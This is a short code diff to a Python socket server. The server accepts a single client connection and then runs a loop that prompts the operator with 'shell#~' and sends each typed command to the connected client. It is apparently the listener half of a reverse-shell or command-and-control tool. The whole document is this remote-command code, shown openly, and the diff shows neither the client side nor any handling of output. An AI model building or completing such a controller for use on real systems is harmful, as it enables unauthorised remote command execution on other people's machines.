@@ -1,5 +1,6 @@
 import socket, base64
 from termcolor import colored
+from socket_handlers import *
 
 
 def run_server(host, port):
@@ -11,6 +12,14 @@ def run_server(host, port):
     print(colored("[+] Server Is Listening...", "blue"))
     client_socket, client_address = server_socket.accept()
     print(colored(f"[+] Connected To {str(client_address)} Client", "green"))
+
+    while True:
+        command = input(colored("shell#~", "light_yellow"))
+        if command.rstrip() == "":
+            continue
+        socket_send(client_socket, command)
+        
+        
 
 
 if "__main__" == __name__:
